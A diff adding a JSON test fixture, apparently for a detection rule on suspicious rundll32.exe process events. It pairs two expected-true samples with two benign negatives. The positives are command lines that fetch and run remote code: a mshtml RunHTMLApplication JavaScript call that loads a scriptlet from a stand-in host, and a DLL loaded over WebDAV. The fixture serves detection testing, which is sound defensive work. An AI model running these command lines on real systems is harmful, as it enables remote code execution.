@@ -1,0 +1,10 @@
+[
+  {"note": "mshtml RunHTMLApplication JavaScript",
+   "event": {"Image": "C:\\Windows\\System32\\rundll32.exe", "CommandLine": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://x.example.invalid/a.sct\")"}, "expected": true},
+  {"note": "DLL loaded from WebDAV URL",
+   "event": {"Image": "C:\\Windows\\System32\\rundll32.exe", "CommandLine": "rundll32.exe \\\\203.0.113.5@SSL\\DavWWWRoot\\x.dll,Start https://203.0.113.5/"}, "expected": true},
+  {"note": "Printer UI",
+   "event": {"Image": "C:\\Windows\\System32\\rundll32.exe", "CommandLine": "rundll32.exe printui.dll,PrintUIEntry /il"}, "expected": false},
+  {"note": "Locking the workstation",
+   "event": {"Image": "C:\\Windows\\System32\\rundll32.exe", "CommandLine": "rundll32.exe user32.dll,LockWorkStation"}, "expected": false}
+]
